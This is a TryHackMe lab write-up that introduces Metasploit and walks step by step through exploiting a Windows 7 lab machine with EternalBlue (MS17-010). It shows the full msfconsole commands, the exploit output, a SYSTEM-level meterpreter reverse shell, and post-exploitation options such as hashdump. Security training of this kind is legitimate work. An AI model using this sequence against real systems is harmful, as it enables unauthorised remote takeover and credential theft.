# 🛠️ TryHackMe: Metasploit: Introduction

## Room Info

| Field | Details |
|---|---|
| Platform | TryHackMe |
| Room | Metasploit: Introduction |
| Category | Offensive Security / Tooling |
| Difficulty | Easy |
| Tools Used | msfconsole, Metasploit Framework |
| Target | Windows 7 Pro SP1 x64 (lab machine) |
| Attacker | Kali Linux (local) |

---

## 🧩 Description

This wasn't my first experience using the Metasploit Framework, but it was a good one. The room started with the theory: modules, exploits, payloads, encoders: then
moved into `msfconsole`, and ended with a real
exploit of the lab machine using
`ms17_010_eternalblue` to land a meterpreter
shell as `NT AUTHORITY\SYSTEM`.

---

## 🖥️ Task 1: Virtual Environment

I started by spinning up the room's virtual
environment from the THM page. Two machines
were provisioned:
- **Attacker machine**: my local Kali box
  (I connected to THM's lab network via
  the OpenVPN config from the room)
- **Lab machine**: the Windows 7 target
  vulnerable to MS17-010

Once both were up, my Kali box was on the same
internal network as the lab IP and ready to
attack.

---

## 📚 Task 2: Main Components of Metasploit

### Core Concepts

| Concept | Definition |
|---|---|
| **Vulnerability** | A design, coding, or logic flaw in the target system |
| **Exploit** | Code that takes advantage of a vulnerability |
| **Payload** | Code that runs on the target to achieve the attacker's goal |

### Module Categories

| Category | Purpose |
|---|---|
| `auxiliary/` | Scanners, crawlers, fuzzers: supporting modules |
| `exploits/` | Exploits organized by target OS |
| `payloads/` | Code that runs on the target post-exploitation |
| `post/` | Post-exploitation modules (gather, manage) |
| `encoders` | Encode payloads to avoid bad characters |
| `nops` | NOP generators: keep payload size consistent |
| `evasion` | Modules that try to bypass antivirus |

### Payload Types

| Type | Description |
|---|---|
| **Singles** | Self-contained payloads: everything in one shot |
| **Stagers** | Small payloads that download the real stage |
| **Stages** | The actual payload downloaded by a stager |

`windows/x64/pingback_reverse_tcp` is a **Singles** payload: it ships as one self-contained piece.

---

## 🖥️ Task 3: Msfconsole

I launched `msfconsole` from a terminal on my
Kali box. The console is the main interface to
the Metasploit Framework.

### Prompt Types I Saw

| Prompt | Meaning |
|---|---|
| `msf6 >` | Default msfconsole prompt (no module loaded) |
| `msf6 exploit(windows/smb/ms17_010_eternalblue) >` | Context prompt: a module is loaded |
| `meterpreter >` | A meterpreter session is active on a target |
| `C:\Windows\system32>` | A shell on the target is active |

### Commands I Used

| Command | Purpose |
|---|---|
| `help` | List all available commands |
| `search <keyword>` | Find modules by name |
| `use <module>` | Select a module |
| `info` / `info <module>` | Show module details, options, authors |
| `show options` | List configurable options for the current module |
| `set <OPTION> <value>` | Set an option for the current module |
| `setg <OPTION> <value>` | Set a global value used across modules |
| `unset <OPTION>` | Clear a previously set option |
| `exploit` / `run` | Run the selected module |
| `exploit -z` | Run exploit and don't background the session |
| `back` | Leave the current module context |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with a specific session |
| `Ctrl+Z` | Background the current session |
| `history` | Show command history (with tab completion) |
| `clear` | Clear the terminal |

I also discovered `msfconsole` supports most
basic Linux commands (but **not output
redirection** like `>`):
```bash
msf6 > ls
msf6 > ping -c 1 8.8.8.8
```

### The `info` Command

`info` was the first thing I ran after
selecting a module. It showed me options,
description, authors, and references. For
`ms17_010_eternalblue` it showed:
```
Available targets:
  Id  Name
  --  ----
  0   Windows 7 and Server 2008 R2 (x64) All Service Packs

Basic options:
  Name          Current Setting  Required  Description
  ----          ---------------  --------  -----------
  RHOSTS                         yes       Target host(s)
  RPORT         445              yes       Target port (TCP)
  VERIFY_ARCH   true             yes       Check arch
  VERIFY_TARGET true             yes       Check OS
```

---

## ⚙️ Task 4: Working with Modules

`msfconsole` is **context-managed**: options
I `set` only applied to the current module.
When I `use`d a different module, my `set`
values were lost: unless I used `setg`
(global).

### Setting Options
```bash
# Set the local port the payload would connect back on
msf6 > set LPORT 6666

# Set the target host (global, persists across modules)
msf6 > setg RHOSTS 10.10.x.x

# Clear a payload so I could pick a different one
msf6 > unset PAYLOAD

# Run the exploit
msf6 > exploit
```

### Multiple Sessions

`msfconsole` held multiple sessions for me at
once. I listed them with `sessions`:
```bash
msf6 > sessions

Active sessions
===============
  Id  Name  Type              Information
  --  ----  ----              -----------
  1         meterpreter x64   NT AUTHORITY\SYSTEM @ JON-PC
  2         meterpreter x64   NT AUTHORITY\SYSTEM @ JON-PC
```

To interact with a specific one:
```bash
msf6 > sessions -i 1
```

To background a session and return to the
msfconsole prompt: `Ctrl+Z`.

---

## ⚔️ Task 5: Exploitation: EternalBlue (MS17-010)

This was the hands-on part. The lab machine
was running Windows 7 Pro SP1 x64: vulnerable
to **MS17-010** (EternalBlue), the SMBv1 remote
code execution leaked by the Shadow Brokers in
2017.

### Step 1: Search for the Exploit
```bash
msf6 > search ms17_010
```

### Step 2: Select the Module
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

### Step 3: Check Options
```bash
msf6 > show options
```

I needed to set:
- `RHOSTS` → the lab machine IP
- `RPORT` → 445 (default, SMB)

The default payload was
`windows/x64/meterpreter/reverse_tcp`, which
needed:
- `LHOST` → my Kali IP
- `LPORT` → 4444 (default)

### Step 4: Configure the Exploit
```bash
msf6 > set RHOSTS 10.10.x.x
msf6 > set LHOST 10.10.x.x
```

### Step 5: Run the Exploit
```bash
msf6 > exploit -z
```

### Step 6: Watch It Work
```
[*] Started reverse TCP handler on 10.10.x.x:4444
[+] 10.10.x.x:445 - Host is likely VULNERABLE to MS17-010!
    - Windows 7 Professional 7601 Service Pack 1 x64
[*] 10.10.x.x:445 - Connecting to target for exploitation.
[+] 10.10.x.x:445 - Connection established for exploitation.
[+] 10.10.x.x:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.x.x:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.x.x:445 - Sending all but last fragment of exploit packet
[*] 10.10.x.x:445 - Starting non-paged pool grooming
[+] 10.10.x.x:445 - Sending SMBv2 buffers
[+] 10.10.x.x:445 - Closing SMBv1 connection creating free hole
[*] 10.10.x.x:445 - Sending final SMBv2 buffers.
[*] 10.10.x.x:445 - Sending last fragment of exploit packet!
[+] 10.10.x.x:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.x.x:445 - Sending egg to corrupted connection.
[*] 10.10.x.x:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.x.x
[*] Meterpreter session 2 opened (10.10.x.x:4444 -> 10.10.x.x:49186)
[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

### Step 7: Confirm the Session
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (Build 7601, Service Pack 1)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

I had **SYSTEM**: full administrative control
of the box. From here I could:
- `shell` → drop into a Windows cmd
- `upload` / `download` → move files
- `hashdump` → dump SAM hashes
- `screenshot` → capture the screen
- `webcam_snap` → snap the webcam (if present)

---

## 💡 Lessons Learned

- Metasploit is a **framework**, not a single
  tool: exploits, payloads, encoders, post
  modules all live in separate folders
- The **exploit** is the *how* (the SMB flaw
  MS17-010); the **payload** is the *what*
  (meterpreter, shell, etc.): they're
  independent and I mixed them depending on
  the target
- `msfconsole` is **context-managed**:
  module-level `set` values were lost when I
  switched modules; `setg` for global values
  that persist
- `info` was the first thing to run on a
  module: it told me options, targets,
  authors, and references
- `unset PAYLOAD` let me swap payloads
  without leaving the module
- `Ctrl+Z` backgrounds the current session;
  `sessions -i <id>` returns to it
- **EternalBlue (MS17-010)** is a real
  world-stomping SMBv1 RCE: patched in
  March 2017 but still pops unpatched boxes
  in the wild
- Getting `NT AUTHORITY\SYSTEM` on a Windows
  box = full compromise: registry, SAM, all
  files, all processes
- The flow **always** repeated:
  `search` → `use` → `show options` → `set` →
  `exploit` → `sessions` → interact

---

## 🛠️ Tools Used

- **msfconsole**: Main Metasploit Framework CLI
- **Metasploit Framework**: Pre-built exploits, payloads, and modules
- **SMBv1**: The vulnerable protocol on the target

---

*Completed on TryHackMe: legal controlled
environment*
